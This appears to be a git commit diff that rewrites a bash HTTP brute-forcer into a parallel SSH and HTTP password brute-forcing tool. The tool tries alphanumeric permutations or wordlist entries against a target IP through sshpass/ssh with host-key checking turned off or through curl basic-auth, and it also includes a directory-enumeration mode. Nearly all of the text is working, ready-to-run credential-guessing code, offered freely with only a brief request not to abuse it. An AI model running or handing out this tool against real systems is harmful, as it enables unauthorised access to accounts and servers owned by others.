f4288befb9a0deab91626c6ba19676fa40a3601d
Marc Carlson <138807964+carls0n@users.noreply.github.com>
2023-11-08 09:35:03 -0800

    Add files via upload

--- alpha2.sh
+++ alpha2.sh
@@ -1,9 +1,8 @@
 #!/usr/bin/env bash
 
-# alpha2.sh
-# written by Marc Carlson June 18, 2022
-# My other repositories: https://github.com/carls0n/
-# bash parallel http bruteforcer. Tries all possible alphanumeric combinations based on the number of characters.
+# getpass.sh
+# written by Marc Carlson November 5, 2023
+# bash parallel SSH bruteforcer. Tries all possible alphanumeric combinations based on the number of characters.
 # also has an option to use a password file instead.
 # this is free software. free to use, free to redistribute. Do whatever you like with it.
 # if you want to add support for uppercase letters, add {A..Z} to the character set.
@@ -11,40 +10,43 @@
 
 # Please do not abuse this script. Use it on your own machines.
 
+unset DISPLAY
+
 charset=({a..z} {0..9})
 
 usage() {
-echo "alpha2 http parallel login hacker (Marc Carlson 2022-2023)"
-echo "Usage: alpha2 [pcautwdh] [options]"
+echo "getpass parallel SSH bruteforce tool (Marc Carlson 2023)"
+echo "usage: ./getpass.sh [cautwh] [options]"
 echo "-c  number of characters to use for password permutation"
 echo "-a  IP address of remote target"
 echo "-u  username to use"
 echo "-t  number of threads to use"
-echo "-p  socks5 proxy address"
 echo "-w  use the wordlist instead. /path/to/list."
-echo "-d  directory enumeration mode. Use with -t and -w"
 }
 
 SECONDS=0
 
 get_args() {
 [ $# -eq 0 ] && usage && exit
-while getopts "p:a:u:t:c:hw:id" arg; do
+while getopts ":ha:u:t:c:w:v:" arg; do
 case $arg in
 a) ip="$OPTARG" ;;
 u) user="$OPTARG" ;;
 t) threads="$OPTARG" ;;
 c) characters="$OPTARG" ;;
-p) proxy="--socks5 $OPTARG" ;;
 w) wordlist="$OPTARG" ;;
-d) direnum=1;;
 h) usage && exit ;;
+v) type="$OPTARG" ;;
+#d) direnum=1;;
 esac
 done
 }
 
 type -P parallel 1>/dev/null
 [ "$?" -ne 0 ] && echo "Please install GNU parallel before using this script." && exit
+type -P sshpass 1>/dev/null
+[ "$?" -ne 0 ] && echo "Please install sshpass before using this script." && exit
+
 
 function check_flags {
 if [[ ! $ip ]]
@@ -55,19 +57,24 @@ if [[ ! $threads ]]
 then
 echo please indicate the number of threads with the -t flag && exit
 fi
-if [[ ! $user ]] && [[ ! $direnum ]]
+if [[ ! $user ]] && [[ $type != "direnum" ]]
 then
 echo please indicate the desired user name with the -u flag unless using direnum && exit
-fi
-if [[ $direnum ]] && [[ ! $wordlist ]]
-then
-echo when using the -d flag, it is also neccessary to indicate the path to the wordlist && exit
 fi
 if [[ ! $characters ]] && [[ ! $wordlist ]]
 then
 echo Please indicate either the -w flag and wordlist or the -c flag and number of characters && exit
 fi
+if [[ -z $type ]]
+then
+echo Please indicate the type of attack \(ssh/http or direnum\) with the -v flag && exit
+fi
+if [[ $type == "direnum" ]] && [[ $characters ]]
+then
+echo password permutation not available for direnum. Please use -w wordlist instead && exit
+fi
 }
+
 
 # Credit to pskocik for permutation function based on a post at stackexchange -> https://unix.stackexchange.com/users/23692/pskocik
 
@@ -79,30 +86,12 @@ permute "$((${1} - 1 ))" "$2$char"
 done
 }
 
-
-function direnum {
-parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip/{} :::: $wordlist |\
-awk '{if($1 =="401") {print $1 " " $2} else if ($1 == "000") {print "Exit with code 000"; exit}}' && exit
-}
-
-function bruteforce { 
-permute $characters | parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip -u $user:{} |\
-awk '{if($1 == "200") {print "Found password -> " $2; exit} else if ($1 == "000") { print "Exit with code 000"; exit}\
-else if ($1 =="403") { print "Exit with code 403"; exit}'} > .password
-}
-
 get_args $@
 check_flags
 
 
-function wordlist {
-parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip -u $user:{} :::: $wordlist |\
-awk '{if($1 == "200") {print "Found Password -> " $2 ;exit} else if ($1 == "000") { print "Exit with code 000"; exit}\
-else if ($1 =="403") { print "Exit with code 403"; exit}'} > .password
-}
-
 function update {
-while true 
+while true
 do
 sleep 300
 if [[ $(($SECONDS/3600)) -ge 1 ]]
@@ -114,33 +103,78 @@ fi
 done
 }
 
-if [[ $direnum == 1 ]]
+function direnum {
+parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip/{} :::: $wordlist |\
+awk '{if($1 =="401") {print $1 " " $2} else if ($1 == "000") {print "Exit with code 000"; exit}}' && exit
+}
+
+trap 'test' SIGTERM
+
+function ssh {
+if [[ $wordlist ]] && [[ -z $characters ]]
+then
+parallel -k -j $threads sshpass -p {} ssh -oStrictHostKeyChecking=no -q $user@$ip echo Found password: {} :::: $wordlist > .password
+elif [[ $characters ]] && [[ -z $wordlist ]]
+then
+permute $characters | parallel -k -j $threads sshpass -p {} ssh -oStrictHostKeyChecking=no -q $user@$ip echo Found password: {}  > .password
+fi
+}
+
+function http { 
+if [[ $wordlist ]] && [[ -z $characters ]]
+then
+parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip -u $user:{} :::: $wordlist |\
+awk '{if($1 == "200") {print "Found Password -> " $2 ;exit} else if ($1 == "000") { print "Exit with code 000"; exit}\
+else if ($1 =="403") { print "Exit with code 403"; exit}'} > .password
+elif [[ -z $wordlist ]] && [[ $characters ]]
+then
+permute $characters | parallel -k -j $threads -q curl -s -o /dev/null -w '%{http_code} {}\n' $proxy $ip -u $user:{} |\
+awk '{if($1 == "200") {print "Found password -> " $2; exit} else if ($1 == "000") { print "Exit with code 000"; exit}\
+else if ($1 =="403") { print "Exit with code 403"; exit}'} > .password
+fi
+}
+
+if [[ $type == "direnum" ]]
 then direnum
 fi
-if [[ $characters ]] && [[ -z $wordlist ]]
+if [[ $type == "ssh" ]]
 then
-bruteforce &
+ssh &
 pid=$!
 update &
 updatepid=$!
-else
-wordlist &
+elif [[ $type == "http" ]]
+then
+http &
 pid=$!
 update &
 updatepid=$!
 fi
 
-if [[ -e .password ]]; then rm .password; fi
-if [[ ! -e .password ]]; then touch .password; fi
+if [[ -e .password ]]; then rm .password
+fi
+if [[ ! -e .password ]]; then touch .password
+fi
 
-while [[ -z $(cat .password) ]]
+while kill -0 $pid 2>/dev/null
 do
 sleep 1
 if [[ ! -z $(cat .password) ]]
 then
-kill $updatepid 2>/dev/null
+kill -s SIGTERM 0
+pkill sleep
+elif ! kill -0 $pid 2>/dev/null
+then
+kill -s SIGTERM 0
 pkill sleep
 fi
 done
-echo $(cat .password)
+
+if [[ ! -z .password ]]
+then
+while read line
+do
+echo "$line"
+done< .password
+fi
 rm .password
